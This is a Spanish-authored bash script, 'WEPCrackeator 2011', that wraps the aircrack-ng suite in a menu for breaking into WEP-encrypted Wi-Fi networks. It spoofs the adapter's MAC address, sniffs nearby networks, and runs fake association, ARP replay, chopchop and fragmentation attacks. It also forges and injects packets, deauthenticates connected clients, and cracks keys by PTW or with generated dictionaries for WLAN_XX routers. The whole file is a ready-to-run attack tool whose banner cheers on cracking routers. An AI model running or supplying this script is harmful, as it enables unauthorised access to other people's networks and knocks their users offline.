#!/bin/bash

#Global VARs

	#Style VARs
	YELLOW="\033[1;33m"
	RED="\033[0;31m"
	PURPLE="\033[0;35m"
	BLUE="\033[0;34m"
	BROWN="\033[0;33m"
	ENDCOLOR="\033[0m"
	BLINK="\E[5m"
	ENDBLINK="\E[25m"

	#Other VARs
	EXIT=0

clear
echo -e "*****************************************************************"
echo -e "*"$RED"                      WEPCrackeator 2011                       "$ENDCOLOR"*"
echo -e "*****************************************************************"
echo -e "*"$YELLOW"    Siempre es buen momento para crackear un router WEP  :D    "$ENDCOLOR"*"
echo -e "*****************************************************************"
echo -e "*"$PURPLE"                       Made by SeRGiNaToR                      "$ENDCOLOR"*"
echo -e "*"$PURPLE"                    28-01-2011 - "$BLINK"versión 1.0"$ENDBLINK"                   "$ENDCOLOR"*"
echo -e "*****************************************************************"
echo
echo "			Setting the environment"
echo -e $YELLOW"*** Removing mon0 if exists ***"$ENDCOLOR
airmon-ng stop mon0 > /dev/null
echo -e $YELLOW"*** Getting the wifi usb interface (RT73USB) ***"$ENDCOLOR
RT73USB=`airmon-ng| grep "rt" | awk '{print $1}'`
echo -e $YELLOW"*** Got it! The interface is $RT73USB ***"$ENDCOLOR
iw reg set BO
sleep 2
#This option doesn't work with RT73USB
#echo -e $YELLOW"***Increasing the power of the interface ***"$ENDCOLOR
#iwconfig $RT73USB txpower 30
#sleep 2
echo -e $YELLOW"*** $RT73USB in monitor mode ***"$ENDCOLOR
airmon-ng start $RT73USB > /dev/null
echo -e $YELLOW"*** Spoofing $RT73USB and mon0 ***"$ENDCOLOR
MIMAC=00:11:22:33:44:55
ifconfig $RT73USB down
sleep 2
macchanger -m $MIMAC $RT73USB > /dev/null
ifconfig $RT73USB up
ifconfig mon0 down
sleep 2
macchanger -m $MIMAC mon0 > /dev/null
ifconfig mon0 up
echo -e $YELLOW"*** Removing residual files from other scans ***"$ENDCOLOR
rm out*
rm replay*
rm *.xor
rm *.dictionary
rm *-request
rm temp-0*
sleep 1

while [ $EXIT==0 ]
do
	clear

	echo -e "*****************************************************************"
	echo -e "*"$RED"                      WEPCrackeator 2011                       "$ENDCOLOR"*"
	echo -e "*****************************************************************"
	echo -e "*"$YELLOW"    Siempre es buen momento para crackear un router WEP  :D    "$ENDCOLOR"*"
	echo -e "*****************************************************************"
	echo -e "*"$PURPLE"                       Made by SeRGiNaToR                      "$ENDCOLOR"*"
	echo -e "*"$PURPLE"                    28-01-2011 - "$BLINK"versión 1.0"$ENDBLINK"                   "$ENDCOLOR"*"
	echo -e "*****************************************************************"
	echo "1) Launch airodump-ng."
	echo "2) Launch airodump-ng against a chosen network."
	echo "3) Asociate"
	echo "4) Launch aireplay-ng (-p 0841)"
	echo "5) Launch aireplay-ng with ARP injection"
	echo "6) ChopChop"
	echo "7) Fragmented"
	echo "8) Create ARP packet if options 6 or 7 worked"
	echo "9) Inject packet created in option 8"
	echo "10) Throw clientes (if there's any)"
	echo "11) Crack ap"
	echo "12) Crack ap using PTW algorythm"
	echo "13) Create dictionary for WLAN_XX networks"
	echo "14) Crack WLAN_XX network using dictionary created in option 13"
	echo "0) Exit"

	echo -n "Option: "
	read OPTION
	case $OPTION in
	1)
		xterm -geometry 90x15+500+0 -fg yellow -bg black -hold -title "Sniffing packets..." -e airodump-ng mon0 -a --encrypt wep -w temp &
		;;
	2)
		cat temp-01.csv |awk '{print $1,$20,$6}' >> temp-00001.csv
		clear
		cat temp-00001.csv
		echo -n "BSSID: "
		read MACAP
		echo -n "ESSID: "
		read APNAME
		echo -n "Channel: "
		read CHANNEL
		killall xterm
		rm temp-*
		xterm -geometry 90x15+500+0 -fg yellow -bg black -hold -title "Sniffing $APNAME packets..." -e airodump-ng mon0 -a --bssid $MACAP --channel $CHANNEL --ivs -w out &
		;;
	3)
		xterm -geometry 90x15+0+200 -fg yellow -bg black -hold -title "Asociating with $APNAME..." -e aireplay-ng -1 6000 -o 1 -q 10 --ignore-negative-one -a $MACAP -h $MIMAC mon0 &
		;;
	4)
		xterm -geometry 90x15+500+200 -fg yellow -bg black -hold -title "Attacking $APNAME with -p 0841..." -e aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b $MACAP -h $MIMAC --ignore-negative-one mon0 &
		;;
	5)
		xterm -geometry 90x15+500+200 -fg yellow -bg black -hold -title "Attacking $APNAME with ARP injection..." -e aireplay-ng -3 -b $MACAP -h $MIMAC --ignore-negative-one mon0 &
		;;
	6)
		xterm -geometry 90x15+500+400 -fg yellow -bg black -hold -title "Attacking $APNAME with ChopChop..." -e aireplay-ng -4 -b $MACAP -h $MIMAC --ignore-negative-one mon0 &
		;;
	7)
		xterm -geometry 90x15+500+400 -fg yellow -bg black -hold -title "Attacking $APNAME with fragmentation..." -e aireplay-ng -5 -b $MACAP -h $MIMAC --ignore-negative-one mon0 &
		;;
	8)
		packetforge-ng -0 -a $MACAP -h $MIMAC -k 255.255.255.255 -l 255.255.255.255 -y *.xor -w arp-request &
		;;
	9)
		xterm -geometry 90x15+500+400 -fg yellow -bg black -hold -title "Attacking $APNAME injecting created packets..." -e aireplay-ng -2 -r arp-request -h $MIMAC --ignore-negative-one mon0 &
		;;
	10)
		xterm -geometry 90x15+0+200 -fg yellow -bg black -hold -title "Deautentify clients in $APNAME..." -e aireplay-ng -0 5 -a $MACAP --ignore-negative-one mon0 &
		;;
	11)
		xterm -geometry 100x30+0+400 -fg yellow -bg black -hold -title "Cracking $APNAME..." -e aircrack-ng -a 1 *.cap
		;;
	12)
		xterm -geometry 100x30+0+400 -fg yellow -bg black -hold -title "Cracking $APNAME with PTW..." -e aircrack-ng -a 1 -P 2 *.cap
		;;
	13)
		xterm -e wlandecrypter $MACAP $APNAME $APNAME.dictionary
		;;
	14)
		xterm -geometry 100x30+0+400 -fg yellow -bg black -hold -title "Cracking $APNAME with dictionary..." -e aircrack-ng -a 1 *.cap -w $APNAME.dictionary
		;;
	0)
		killall xterm
		echo -e $YELLOW"*** Removing files created during the scan ***"$ENDCOLOR
		rm out*
		rm replay*
		rm *.xor
		rm *.dictionary
		rm *-request
		rm temp-0*
		clear
		echo "Good luck friend!"
		exit 1
	esac
done
